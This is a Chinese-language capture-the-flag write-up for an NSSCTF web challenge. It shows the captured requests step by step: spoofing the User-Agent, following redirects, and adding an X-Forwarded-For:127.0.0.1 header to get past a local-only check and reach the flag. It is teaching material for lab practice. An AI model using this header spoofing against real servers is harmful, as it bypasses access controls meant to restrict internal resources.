---
title: "Do_you_know_http"
date: 2026-03-15 13:28:20
categories:
- Capture_The_Flag_夺旗赛
- 夺旗赛Write-up
- NSSCTF2025
---

_**<font style="color:rgb(0, 0, 0);">一、看题目环境：</font>**_

<font style="color:rgb(36, 41, 46);">环境页面显示：  
</font><font style="color:rgb(36, 41, 46);">Please use 'WLLM' browser!  
</font><font style="color:rgb(36, 41, 46);">意思为：</font>

```plain
请使用“ wllm”浏览器！
```

<font style="color:rgb(36, 41, 46);">好看到这里都可以了，去用burp suite进行抓包改请求。</font>

_**<font style="color:rgb(0, 0, 0);">二、使用工具burp suite进行抓包，并对其中参数有所理解：</font>**_

<font style="color:rgb(36, 41, 46);">GET:到  
</font><font style="color:rgb(36, 41, 46);">Host:来自  
</font><font style="color:rgb(36, 41, 46);">User-Agent: 用户-代理  
</font><font style="color:rgb(36, 41, 46);">Upgrade-Insecure-Requests: 升级-不安全的-请求  
</font><font style="color:rgb(36, 41, 46);">Content-Length: 内容长度  
</font><font style="color:rgb(36, 41, 46);">Cache-Control: 缓存-控制  
</font><font style="color:rgb(36, 41, 46);">X-Forwarded-For: HTTP的请求端真实的IP  
</font><font style="color:rgb(36, 41, 46);">Request: 请求  
</font><font style="color:rgb(36, 41, 46);">Response: 响应</font>

_**<font style="color:rgb(0, 0, 0);">三、抓包分析改请求，拿flag：</font>**_

<font style="color:rgb(36, 41, 46);">打开环境用burp suite进行抓包  
</font><font style="color:rgb(36, 41, 46);">返回数据：  
</font><font style="color:rgb(36, 41, 46);">GET /hello.php HTTP/1.1</font>

```plain
Host: node2.anna.nssctf.cn:28873

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```

<font style="color:rgb(36, 41, 46);">题目环境中告诉我们说要用WLLM浏览器，所以我们须要改User-Agent的值为WLLM  
</font><font style="color:rgb(36, 41, 46);">GET /hello.php HTTP/1.1</font>

```plain
Host: node2.anna.nssctf.cn:28873

User-Agent:WLLM

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```

<font style="color:rgb(36, 41, 46);">鼠标右键Send to Repeater送去重放  
</font><font style="color:rgb(36, 41, 46);">返回结果为：  
</font><font style="color:rgb(36, 41, 46);">HTTP/1.1 302 Found #发现</font>

```plain
Date: Fri, 21 Jul 2023 12:52:27 GMT            #日期

Server: Apache/2.4.25 (Debian)                 #服务器

X-Powered-By: PHP/5.6.40                       #动力来自于a

Location: ./a.php                              #位置

Content-Length: 7                              #内容长度

Connection: close                              #连接

Content-Type: text/html; charset=UTF-8         #内容类型

success                                        #成功
```

# <font style="color:rgb(0, 0, 0);">在Location位置发现关键PHP文件：a.php</font>
<font style="color:rgb(36, 41, 46);">在GET位置将hello.php文件修改为a.php并点击Send发送：  
</font><font style="color:rgb(36, 41, 46);">GET /a.php HTTP/1.1</font>

```plain
Host: node2.anna.nssctf.cn:28873

User-Agent:WLLM

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```

<font style="color:rgb(36, 41, 46);">返回结果为：  
</font><font style="color:rgb(36, 41, 46);">HTTP/1.1 200 OK</font>

```plain
Date: Fri, 21 Jul 2023 13:01:28 GMT

Server: Apache/2.4.25 (Debian)

X-Powered-By: PHP/5.6.40

Content-Length: 64

Connection: close

Content-Type: text/html; charset=UTF-8

You can only read this at local!<br>Your address123.9.161.232
最后一句话告诉我们只能在本地可以进行访问
```

<font style="color:rgb(36, 41, 46);">所有我们要在Request请求中添加：X-Forwarded-For:127.0.0.1（需注意的是任意行都可以添加除了第一行，有时候也不对，有的位置可以，有的位置不可以，总之多试试。冒号:注意是英文冒号！）  
</font><font style="color:rgb(36, 41, 46);">GET /a.php HTTP/1.1</font>

```plain
X-Forwarded-For:127.0.0.1

Host: node2.anna.nssctf.cn:28873

User-Agent:WLLM

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```

<font style="color:rgb(36, 41, 46);">返回结果为：  
</font><font style="color:rgb(36, 41, 46);">HTTP/1.1 302 Found</font>

```plain
Date: Fri, 21 Jul 2023 13:14:35 GMT

Server: Apache/2.4.25 (Debian)

X-Powered-By: PHP/5.6.40

Location: ./secretttt.php

Content-Length: 60

Connection: close

Content-Type: text/html; charset=UTF-8

You can only read this at local!<br>Your address127.0.0.1
```

# <font style="color:rgb(0, 0, 0);">在Location位置发现重要的php文件：secretttt.php</font>
<font style="color:rgb(36, 41, 46);">在GET位置将a.php修改为secretttt.php并点击Send进行发送：  
</font><font style="color:rgb(36, 41, 46);">GET /secretttt.php HTTP/1.1</font>

```plain
X-Forwarded-For:127.0.0.1

Host: node2.anna.nssctf.cn:28873

User-Agent:WLLM

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```

<font style="color:rgb(36, 41, 46);">返回结果为：  
</font><font style="color:rgb(36, 41, 46);">HTTP/1.1 200 OK</font>

```plain
Date: Fri, 21 Jul 2023 13:28:23 GMT

Server: Apache/2.4.25 (Debian)

X-Powered-By: PHP/5.6.40

Content-Length: 44

Connection: close    

Content-Type: text/html; charset=UTF-8

NSSCTF{0bbd067c-24bd-454c-9111-6cd1b67b6da4}
```

# <font style="color:rgb(0, 0, 0);">拿到flag：</font>
```plain
#NSSCTF{0bbd067c-24bd-454c-9111-6cd1b67b6da4}
```

